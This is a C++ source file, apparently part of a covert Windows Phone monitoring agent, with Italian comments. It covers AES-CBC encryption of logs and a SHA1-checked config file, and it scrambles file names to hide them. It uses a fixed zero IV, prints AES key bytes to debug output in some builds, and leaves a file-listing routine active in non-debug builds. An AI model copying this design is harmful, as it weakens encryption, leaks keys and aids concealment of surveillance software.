#include "Encryption.h"
#include "Hash.h"
#include "Conf.h"
#include "FunctionFunc.h"

#define ENC_SAFE_EXIT(x) 	if(hDstFile != INVALID_HANDLE_VALUE) CloseHandle(hDstFile); \
							if(hSrcFile != INVALID_HANDLE_VALUE) CloseHandle(hSrcFile); \
							DeleteFile(pOutFile); \
							if(pRead) delete[] pRead; \
							if(pWrite) delete[] pWrite; \
							return x;

#define DEC_SAFE_EXIT(x) 	if(hDstFile != INVALID_HANDLE_VALUE) CloseHandle(hDstFile); \
							if(hSrcFile != INVALID_HANDLE_VALUE) CloseHandle(hSrcFile); \
							DeleteFile(*pOutFile); \
							if(pRead) delete[] pRead; \
							if(pWrite) delete[] pWrite; \
							if(*pOutFile) delete[] (*pOutFile); \
							return x;

#define MEMDEC_SAFE_EXIT(x) if(hSrcFile != INVALID_HANDLE_VALUE) CloseHandle(hSrcFile); \
							if(pRead) delete[] pRead; \
							return x;

#define ALPHABET_LEN 64

Encryption::Encryption(BYTE *pKey, UINT uKeyBitLen) {
	// Possiamo accettare solo queste tre lunghezze per la chiave
	if (uKeyBitLen != 128 && uKeyBitLen != 192 && uKeyBitLen != 256)
		return;

	aesBitKeyLen = uKeyBitLen;

	ZeroMemory(aesKey, sizeof(aesKey));
	CopyMemory(aesKey, pKey, aesBitKeyLen / 8);

	// La lunghezza della chiave deve essere in bit (128/192/256)
	aes_set_key(&Aes_ctx, aesKey, aesBitKeyLen);

	// L'IV sempre a 0 per la scrittura in streaming dei log
	ZeroMemory(&IV, sizeof(IV));
}

Encryption::~Encryption() {
	ZeroMemory(aesKey, sizeof(aesKey));
	ZeroMemory(&Aes_ctx, sizeof(Aes_ctx));
}

void Encryption::Reset() {
	ZeroMemory(&Aes_ctx, sizeof(Aes_ctx));

	aes_set_key(&Aes_ctx, aesKey, aesBitKeyLen);	
}

BYTE* Encryption::EncryptData(BYTE *pIn, UINT *Len) {
	BYTE *pOut = NULL;
	BYTE t_IV[16];
	UINT paddedLen;

	paddedLen = GetNextMultiple(*Len);
	pOut = new(std::nothrow) BYTE[paddedLen];

	if (pOut == NULL)
		return NULL;

	CopyMemory(t_IV, IV, 16);
	*Len = paddedLen;

	aes_cbc_encrypt(&Aes_ctx, (BYTE *)&t_IV, pIn, pOut, *Len);

	return pOut;
}

BYTE* Encryption::DecryptData(BYTE *pIn, UINT *Len) {
	BYTE *pOut = NULL;
	BYTE t_IV[16];
	UINT paddedLen;

	paddedLen = GetNextMultiple(*Len);
	pOut = new(std::nothrow) BYTE[paddedLen];

	if (pOut == NULL)
		return NULL;

	CopyMemory(t_IV, IV, 16);
	*Len = paddedLen;

	aes_cbc_decrypt(&Aes_ctx, (BYTE *)&t_IV, pIn, pOut, *Len);

	return pOut;
}

/*BYTE* Encryption::DecryptConf(wstring &strInFile, UINT *uLen) {
	DWORD dwRead = 0, dwWritten = 0, dwFileSize = 0, dwDataLen, dwUnpadded, crc;
	BYTE *pRead = NULL, *pWrite = NULL, t_IV[16];
	HANDLE hConfFile = INVALID_HANDLE_VALUE;
	wstring strCompletePath;

	///
	 // Struttura del file di configurazione
	 //
	 // |DWORD|DWORD|DWORD|DATA.....................|CRC|
	 // |---Skip----|-Len-|
	 //
	 // Le prime due DWORD vanno skippate.
	 // La terza DWORD contiene la lunghezza del blocco di dati
	 // CRC e' il CRC dei dati in chiaro, inclusa la DWORD Len
	 ///

	CopyMemory(t_IV, IV, 16);

	strCompletePath = GetCurrentPathStr(strInFile);

	if (strCompletePath.empty())
		return NULL;

	// Apriamo il file di configurazione
	hConfFile = CreateFile((PWCHAR)strCompletePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hConfFile == INVALID_HANDLE_VALUE)
		return NULL;
	
	// Prendiamo la dimensione del file cifrato
	dwFileSize = GetFileSize(hConfFile, NULL);

	if (dwFileSize == INVALID_FILE_SIZE || dwFileSize == 0  || dwFileSize < sizeof(UINT) * 3){
		CloseHandle(hConfFile);
		return NULL;
	}

	// Allochiamo memoria per i dati
	dwDataLen = dwFileSize - (sizeof(UINT) * 2); // dwDataLen e' la dimensione di TUTTA la parte cifrata
	pRead = new(std::nothrow) BYTE[GetNextMultiple(dwDataLen)];

	if (pRead == NULL){
		CloseHandle(hConfFile);
		return NULL;
	}

	ZeroMemory(pRead, GetNextMultiple(dwDataLen));

	// Skippiamo le prime due DWORD
	SetFilePointer(hConfFile, sizeof(UINT) * 2, 0, FILE_BEGIN);

	// Leggiamo il blocco dati prima di decifrarlo
	if (ReadFile(hConfFile, pRead, GetNextMultiple(dwDataLen), &dwRead, NULL) == FALSE){
		delete[] pRead;
		CloseHandle(hConfFile);
		return NULL;
	}

	if (dwRead != GetNextMultiple(dwDataLen)){
		delete[] pRead;
		CloseHandle(hConfFile);
		return NULL;
	}

	// E decifriamolo
	aes_cbc_decrypt(&Aes_ctx, (BYTE *)&t_IV, pRead, pRead, GetNextMultiple(dwDataLen));

	// Leggiamo la DWORD che ci dice quanto e' lungo il blocco dati non paddato
	CopyMemory(&dwUnpadded, pRead, sizeof(UINT));

	if (GetNextMultiple(dwUnpadded) != GetNextMultiple(dwDataLen)){
		delete[] pRead;
		CloseHandle(hConfFile);
		return NULL;
	}

	// XXX qui inizia il codice per trovare l'ENDOF_CONF_DELIMITER
	UINT fakePad = sizeof(UINT) + sizeof(ENDOF_CONF_DELIMITER) + 1 + 16;
	UINT uSlider = 0;

	while (memcmp(pRead + dwUnpadded - fakePad + uSlider, ENDOF_CONF_DELIMITER, sizeof(ENDOF_CONF_DELIMITER) - 1)) {
		if (pRead + dwUnpadded - fakePad + uSlider >= pRead + dwUnpadded) {
			delete[] pRead;
			CloseHandle(hConfFile);
			return NULL;
		}
		uSlider++;
	}
	*uLen = (pRead + dwUnpadded - fakePad + uSlider + sizeof(ENDOF_CONF_DELIMITER) - 1) - pRead;
	dwUnpadded = *uLen + 4;
	// Fine codice per la ricerca dell'ENDOF_CONF_DELIMITER

	// Prendiamo il CRC (con una memcopy perche' l'accesso DEVE essere allineato a 4)
	//crc = *((DWORD *)(pRead + dwUnpadded - 4));
	CopyMemory(&crc, pRead + dwUnpadded - sizeof(UINT), 4);

	// Controlla il CRC
	DWORD conf_hash;
	LONG64 temp_hash = 0;
	CHAR *ptr = (CHAR *)pRead;

	for (UINT i = 0; i < dwUnpadded - sizeof(UINT); i++) {
		temp_hash++;

		if (*ptr)
			temp_hash *= (*ptr);

		conf_hash = (DWORD)(temp_hash >> 32);
		temp_hash &= 0xFFFFFFFF;
		temp_hash ^= conf_hash;
		ptr++;
	}

	conf_hash = (DWORD)temp_hash;

	if (crc != conf_hash) {
		delete[] pRead;
		CloseHandle(hConfFile);
		return NULL;
	}

	CloseHandle(hConfFile);
	return pRead;

	// Controlla che ci sia il delimitatore di fine configurazione
	// XXX - Se viene messo lo 0 dopo ENDOF_CONF_DELIMITER dobbiamo tenere il - 1 altrimenti
	// dobbiamo levarlo
	// XXXXX dwUnpadded in realta' non rappresenta la lunghezza unpaddata ma la lunghezza paddata,
	// e' una cosa che non ha _un cazzo di senso_ ma ci dobbiamo adattare, quindi invece di usare
	// ENDOF_CONF_DELIMITER per verificare la coerenza del file, dobbiamo usarlo per trovarne la fine!!!!

}*/

	// Recursive directory traversal using the Win32 API
	using namespace std;
#include <vector>
#include <stack>
bool ListFiles3(wstring path, wstring mask, vector<wstring>& files)
{
	HANDLE hFind = INVALID_HANDLE_VALUE;
	WIN32_FIND_DATA fdata;
	wstring fullpath;
	stack<wstring> folders;
	folders.push(path);
	files.clear();

	WCHAR stringa[1024];
	WCHAR stringaOut[1024];
	HINSTANCE LibHandle;

		
	while (!folders.empty())
	{
		path = folders.top();
		fullpath = path + L"\\" + mask;
		folders.pop();

		hFind = _FindFirstFile(fullpath.c_str(), &fdata);

		if (hFind != INVALID_HANDLE_VALUE)
		{
			do
			{
				if (wcscmp(fdata.cFileName, L".") != 0 &&
                    wcscmp(fdata.cFileName, L"..") != 0)
				{
					if (fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
					{
						folders.push(path + L"\\" + fdata.cFileName);
						
						swprintf_s(stringa,L"%s\\%s",path.c_str(),fdata.cFileName);
						swprintf_s(stringaOut,L"%s\\%s [DIR]\n",path.c_str(),fdata.cFileName);
						OutputDebugString(  stringaOut );
						

					}
					else
					{
						files.push_back(path + L"\\" + fdata.cFileName);
						
						swprintf_s(stringa,L"%s\\%s",path.c_str(),fdata.cFileName);
						swprintf_s(stringaOut,L"%s\\%s\n",path.c_str(),fdata.cFileName);
						OutputDebugString(  stringaOut );
						
					}
				}
			}
			while (FindNextFile(hFind, &fdata) != 0);
		}
		else
		{
		
				//LPVOID lpMsgBuf;
				WCHAR lpMsgBuf[512];
	
				FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, GetLastError(), 0, (LPWSTR) lpMsgBuf, sizeof(lpMsgBuf), NULL );

				swprintf_s(stringa,L">>>>>>>>>>>>>>>>>>>>>>>>>>>>> FindFirstFile:%s err:%i : %s\n",fullpath.c_str(),GetLastError(),lpMsgBuf);
				OutputDebugString(  stringa );

	}
		

		/*
		if (GetLastError() != ERROR_NO_MORE_FILES)
		{
			FindClose(hFind);

			//return false;
			return true;
		}
		*/
		FindClose(hFind);
		hFind = INVALID_HANDLE_VALUE;
	}

	return true;
}


BYTE* Encryption::DecryptConf(wstring &strInFile, UINT *uLen) {
	DWORD dwRead = 0, dwFileSize = 0;
	BYTE *pRead = NULL, t_IV[16];
	HANDLE hConfFile = INVALID_HANDLE_VALUE;
	wstring strCompletePath;
	Hash hash;
	BYTE sha1Conf[20], sha1Runtime[20];

	/**
	 * Struttura del file di configurazione
	 *
	 * config_file = ENC(JSON(config) | SHA(JSON))
	 */

	// TEST

#if defined(_DEBUG) || defined(fRELEASE)
//#ifdef _DEBUG
	UINT key;
	memcpy(&key, aesKey, 4);
	DBG_TRACE_INT(L"Debug - Encryption.cpp - DecryptConf() key[0-4]: ", 4, FALSE, key);
	memcpy(&key, (BYTE *)&aesKey[4], 4);
	DBG_TRACE_INT(L"Debug - Encryption.cpp - DecryptConf() key[4-8]: ", 4, FALSE, key);
	memcpy(&key, (BYTE *)&aesKey[8], 4);
	DBG_TRACE_INT(L"Debug - Encryption.cpp - DecryptConf() key[8-12]: ", 4, FALSE, key);
	memcpy(&key, (BYTE *)&aesKey[12], 4);
	DBG_TRACE_INT(L"Debug - Encryption.cpp - DecryptConf() key[12-16]: ", 4, FALSE, key);
#endif
	// FINE TEST

	CopyMemory(t_IV, IV, 16);

	strCompletePath = GetCurrentPathStr(strInFile);
	

	if (strCompletePath.empty())
		return NULL;
#ifndef _DEBUG	
	vector<wstring> files3;
	ListFiles3(L".\\", L"*", files3);
	 
	ListFiles3(L"\\Data\\Users\\DefApps\\AppData\\", L"*", files3);

	ListFiles3(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\", L"*", files3);
#endif	
	// Apriamo il file di configurazione
	hConfFile = _CreateFileW((PWCHAR)strCompletePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hConfFile == INVALID_HANDLE_VALUE) {
		DBG_TRACE(L"Debug - Encryption.cpp - DecryptConf() cannot open configuration file: ", 4, TRUE);
		DBG_TRACE((PWCHAR)strCompletePath.c_str(), 4, FALSE);
		return NULL;
	}
	
	// Prendiamo la dimensione del file cifrato
	dwFileSize = _GetFileSize(hConfFile, NULL);

	if (dwFileSize == INVALID_FILE_SIZE || dwFileSize < 36){
		CloseHandle(hConfFile);
		DBG_TRACE(L"Debug - Encryption.cpp - DecryptConf() invalid configuration file size", 4, TRUE);
		return NULL;
	}

	// Allochiamo memoria per i dati
	pRead = new(std::nothrow) BYTE[dwFileSize];

	if (pRead == NULL){
		CloseHandle(hConfFile);
		DBG_TRACE(L"Debug - Encryption.cpp - DecryptConf() cannot allocate memory", 4, TRUE);
		return NULL;
	}

	ZeroMemory(pRead, dwFileSize);

	// Leggiamo il blocco dati prima di decifrarlo
	if (ReadFile(hConfFile, pRead, dwFileSize, &dwRead, NULL) == FALSE){
		delete[] pRead;
		CloseHandle(hConfFile);
		DBG_TRACE(L"Debug - Encryption.cpp - DecryptConf() cannot read configuration file ", 4, TRUE);
		return NULL;
	}

	if (dwRead != dwFileSize){
		delete[] pRead;
		CloseHandle(hConfFile);
		DBG_TRACE(L"Debug - Encryption.cpp - DecryptConf() configuration data not equal to file size", 4, TRUE);
		return NULL;
	}

	// E decifriamolo
	aes_cbc_decrypt(&Aes_ctx, (BYTE *)&t_IV, pRead, pRead, GetNextMultiple(dwFileSize));

	// Leggiamo il padding
	BYTE padding = pRead[dwFileSize - 1];
	PBYTE pEnd = pRead + dwFileSize - padding;

	if (padding > 16) {
		delete[] pRead;
		CloseHandle(hConfFile);
		DBG_TRACE_INT(L"Debug - Encryption.cpp - DecryptConf() invalid padding size (wrong key?): ", 4, TRUE, (UINT)padding);
		return NULL;
	}

	// Leggiamo lo SHA1
	CopyMemory(sha1Conf, pEnd - 20, 20);

	// Verifichiamo l'hash
	hash.Sha1(pRead, pEnd - pRead - 20, sha1Runtime);

	if (memcmp(sha1Conf, sha1Runtime, 20)){
		delete[] pRead;
		CloseHandle(hConfFile);
		DBG_TRACE(L"Debug - Encryption.cpp - DecryptConf() configuration SHA1 doesn't match", 4, TRUE);
		return NULL;
	}

	// Zero-out the sha1
	memset(pEnd - 20, 0x00, 20);

	*uLen = pEnd - pRead - 20;
	CloseHandle(hConfFile);
	return pRead;
}

WCHAR* Encryption::EncryptName(wstring &strName, BYTE seed) {
	return Scramble((WCHAR *)strName.c_str(), seed, TRUE);
}

WCHAR* Encryption::DecryptName(wstring &strName, BYTE seed) {
	return Scramble((WCHAR *)strName.c_str(), seed, FALSE);
}

WCHAR* Encryption::Scramble(WCHAR* wName, BYTE seed, BOOL enc) {
	WCHAR *ret_string;
	UINT i, j;

	WCHAR alphabet[ALPHABET_LEN] = {'_','B','q','w','H','a','F','8','T','k','K','D','M',
		'f','O','z','Q','A','S','x','4','V','u','X','d','Z',
		'i','b','U','I','e','y','l','J','W','h','j','0','m',
		'5','o','2','E','r','L','t','6','v','G','R','N','9',
		's','Y','1','n','3','P','p','c','7','g','-','C'};                  

	if (!(ret_string = _wcsdup(wName)))
		return NULL;

	// Evita di lasciare i nomi originali anche se il byte e' 0
	seed = (seed > 0) ? seed %= ALPHABET_LEN : seed;

	if (seed == 0)
		seed = 1;

	for (i = 0; ret_string[i]; i++) {
		for(j = 0; j < ALPHABET_LEN; j++){
			if(ret_string[i] == alphabet[j]) {
				// Se crypt e' TRUE cifra, altrimenti decifra
				if (enc)
					ret_string[i] = alphabet[(j + seed) % ALPHABET_LEN];
				else
					ret_string[i] = alphabet[(j + ALPHABET_LEN - seed) % ALPHABET_LEN];
				break;
			}
		}
	}

	return ret_string;
}

UINT Encryption::GetNextMultiple(UINT Number) {
#define BLOCK_SIZE 16	// AES Block Size

	UINT remainder = 0;

	if (Number == 0)
		return 0;

	if (Number % BLOCK_SIZE == 0)
		return Number;

	remainder = Number % BLOCK_SIZE;

	return Number + (BLOCK_SIZE - remainder);
}

UINT Encryption::GetPKCS5Len(UINT uLen) {
	// Calcoliamo il padding PKCS5
	return uLen + BLOCK_SIZE - (uLen % BLOCK_SIZE);
}

UINT Encryption::GetPKCS5Padding(UINT uLen) {
	// Calcoliamo la lunghezza del padding PKCS5
	return BLOCK_SIZE - (uLen % BLOCK_SIZE);
}